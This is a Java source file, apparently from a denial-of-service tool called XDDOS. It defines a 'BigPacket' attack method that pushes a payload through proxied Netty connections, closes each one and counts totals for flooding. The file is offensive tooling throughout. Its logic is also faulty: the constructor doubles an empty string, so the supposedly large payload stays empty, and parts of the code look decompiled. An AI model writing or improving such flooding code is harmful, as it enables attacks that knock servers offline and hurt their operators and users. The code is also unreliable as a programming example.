package XD.XDDOS.methods.impl;
import XD.XDDOS.methods.IMethod;
import XD.XDDOS.utils.NettyBootstrap;
import XD.XDDOS.utils.proxy.ProxyLoader;
import io.netty.buffer.ByteBuf;
import io.netty.buffer.ByteBufOutputStream;
import io.netty.buffer.Unpooled;
import io.netty.channel.Channel;
import java.io.IOException;
import java.security.SecureRandom;
import java.util.Objects;

public class BigPacket implements IMethod {
  SecureRandom r = new SecureRandom();
  
  String lol = "";
  
  final int a = 25555;
  
  public BigPacket() {
    int i = 1; Objects.requireNonNull(this); for (; i < 25555 + 1; i++)
      this.lol = String.valueOf(this.lol) + String.valueOf(this.lol); 
  }
  
  public void accept(Channel channel, ProxyLoader.Proxy proxy) {
    ByteBuf b = Unpooled.buffer();
    ByteBufOutputStream out = new ByteBufOutputStream(b);
    try {
      out.writeUTF(this.lol);
      out.close();
    } catch (IOException e) {
      e.printStackTrace();
    } 
    channel.writeAndFlush(b);
    NettyBootstrap.integer++;
    NettyBootstrap.totalConnections++;
    channel.close();
  }
}
